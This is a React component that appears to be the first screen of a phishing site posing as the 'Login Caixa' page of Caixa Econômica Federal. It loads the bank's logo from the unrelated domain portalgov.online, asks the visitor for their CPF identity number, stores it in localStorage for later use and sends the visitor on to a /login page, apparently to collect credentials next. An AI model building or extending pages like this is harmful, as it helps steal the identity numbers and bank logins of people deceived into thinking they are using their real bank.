
import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { Input } from '@/components/ui/input';

const CPFEntry = () => {
  const [cpf, setCpf] = useState('');
  const navigate = useNavigate();

  const formatCPF = (value: string) => {
    const digits = value.replace(/\D/g, '');
    
    if (digits.length > 11) {
      return digits.slice(0, 11);
    }
    
    return digits;
  };

  const handleCPFChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const rawValue = e.target.value;
    setCpf(formatCPF(rawValue));
  };

  const handleNext = (e: React.FormEvent) => {
    e.preventDefault();
    if (cpf.length > 0) {
      // Store the CPF in localStorage to use it later
      localStorage.setItem('userCPF', cpf);
      navigate('/login');
    }
  };

  return (
    <div className="min-h-screen bg-white flex flex-col">
      <div className="container mx-auto px-6 pt-8 flex-1 flex flex-col items-center max-w-md">
        <div className="w-full flex justify-center mb-8">
          <img 
            src="https://portalgov.online/Caixa_Econômica_Federal_logo.svg.png" 
            alt="Caixa Econômica Federal" 
            className="h-14 w-auto"
          />
        </div>

        <div className="text-center mb-2">
          <h1 className="text-[#005CA9] text-xl font-normal">Login Caixa</h1>
        </div>

        <div className="text-[#5A6978] text-center mb-8 text-base">
          <p>Informe seu CPF e clique em "Próximo" para continuar:</p>
        </div>

        <form className="w-full" onSubmit={handleNext}>
          <div className="mb-6">
            <div className="flex items-center gap-2 mb-2">
              <svg xmlns="http://www.w3.org/2000/svg" className="h-5 w-5 text-[#5A6978]" viewBox="0 0 20 20" fill="currentColor">
                <path fillRule="evenodd" d="M10 9a3 3 0 100-6 3 3 0 000 6zm-7 9a7 7 0 1114 0H3z" clipRule="evenodd" />
              </svg>
              <span className="text-[#5A6978]">CPF</span>
            </div>
            <input
              type="text"
              value={cpf}
              onChange={handleCPFChange}
              className="w-full border-b border-[#FF8C00] focus:outline-none focus:border-b-2 py-2 bg-white"
              placeholder=""
              maxLength={11}
              required
            />
          </div>

          <button
            type="submit"
            className="w-full bg-[#FF8C00] text-white py-4 rounded text-lg font-medium hover:bg-opacity-90 transition-all duration-300 mb-8"
          >
            Próximo
          </button>

          <div className="text-center">
            <p className="text-[#5A6978] mb-4">
              Preciso de ajuda
            </p>
          </div>
        </form>
      </div>
    </div>
  );
};

export default CPFEntry;
